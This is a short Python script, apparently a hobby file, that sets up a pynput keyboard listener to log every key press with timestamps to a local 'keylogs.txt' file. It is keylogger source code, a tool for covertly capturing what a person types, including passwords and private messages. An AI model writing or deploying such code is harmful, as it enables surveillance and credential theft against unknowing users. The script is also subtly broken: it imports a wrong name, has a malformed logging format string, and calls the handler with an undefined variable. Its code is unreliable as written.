# -*- coding: utf-8 -*-
"""
Created on Wed Dec 15 03:24:30 2021

@author: Ata
"""

from pynput.keyboard import keyboard, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level = logging.DEBUG, format = "%(asctime)s: %message)s")


def on_press(key):
    logging.info(str(key))

with Listener(on_press = on_press(key)) as listener:
    listener.join()
